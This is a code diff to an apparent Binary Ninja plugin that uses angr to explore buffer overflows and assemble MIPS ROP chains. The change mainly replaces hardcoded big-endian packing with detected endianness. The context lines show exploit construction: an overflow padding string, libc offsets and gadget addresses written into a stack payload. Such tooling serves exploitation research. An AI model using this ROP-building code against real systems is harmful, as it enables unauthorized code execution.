@@ -55,6 +55,7 @@ class MainExplorer(Explorer):
     @abstractmethod
     def set_sim_manager(self):
         pass
+    
 
 
 class UIPlugin(PluginCommand):
@@ -301,6 +302,12 @@ class BackgroundTaskManager():
         self.init = init
 
     @classmethod
+    def get_endianess(self,bv):
+        if bv.arch.endianness == 1:
+            return 'big'
+        return 'little' 
+
+    @classmethod
     def vuln_explore(self, bv):
         try:
             start_addr = BackgroundTaskManager.start_addr
@@ -330,6 +337,7 @@ class BackgroundTaskManager():
     @classmethod
     def build_rop(self, bv):
         try:
+            endian = BackgroundTaskManager.get_endianess(bv)
             start_addr = BackgroundTaskManager.start_addr
             end_addr = BackgroundTaskManager.end_addr
             ld_path = BackgroundTaskManager.ld_path
@@ -352,7 +360,7 @@ class BackgroundTaskManager():
             self.sleep = self.libc_base + 0x00053ca0
 
             self.init = b"A"*160 + b"BBBB" + \
-                p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
+                p32(self.gadget2, endian=endian)+p32(self.gadget1, endian=endian)
             self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, first=self.gadget1, second=self.gadget2,
                                             third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
 
@@ -396,7 +404,6 @@ class VulnerabilityExplorer(MainExplorer):
         self.args = {}
         self.overflow = False
         self.params = None
-
         self.proj.hook(self.func_end_addr, self.explore)
 
     def explore(self, state):
@@ -426,6 +433,11 @@ class VulnerabilityExplorer(MainExplorer):
                     self.args['arg'+str(counter)] = item.get('param')
                 counter +=1
         return self.args
+
+    def get_endianess(self,bv):
+        if bv.arch.endianness == 1:
+            return 'big'
+        return 'little'
 
     def feed_function_state(self, args=None, data=None):
         self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
@@ -516,6 +528,7 @@ class ROPExplorer(MainExplorer):
         self.sleep = kwargs['sixth']
         self.state_history = collections.OrderedDict()
         self.payload = collections.OrderedDict()
+        self.endian = self.get_endianess(bv)
     
         binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
         binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
@@ -553,6 +566,11 @@ class ROPExplorer(MainExplorer):
                 else:
                     self.args[key] = value
         return self.args
+    
+    def get_endianess(self,bv):
+        if bv.arch.endianness == 1:
+            return 'big'
+        return 'little'
 
     def feed_function_state(self, args=None, data=None):
         self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
@@ -571,7 +589,7 @@ class ROPExplorer(MainExplorer):
     def get_stack_report(self, data):
         contents = "====Stack Data ====\r\n\n"
         for key, value in data.items():
-            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian='big')))
+            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian=self.endian)))
         return contents
 
     def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
@@ -598,7 +616,7 @@ class ROPExplorer(MainExplorer):
             self.stack_adjust(state, sp, 0x20, "EEEE")
             # lw $ra, 0x2c($sp)
             state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
-            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian='big')
+            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian=self.endian)
             self.state_history[hex(self.gadget2)] = state
 
     def hook_gadget2next4(self, state):
@@ -607,7 +625,7 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x28($sp)
             state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
-            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian='big')
+            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian=self.endian)
 
     def hook_gadget2next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -631,7 +649,7 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $ra, 0x24($sp)
             state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
-            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian='big')
+            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian=self.endian)
 
     def hook_gadget3next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -647,7 +665,7 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x1c($sp)
             state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
-            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian='big')
+            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian=self.endian)
 
     def hook_gadget3next16(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
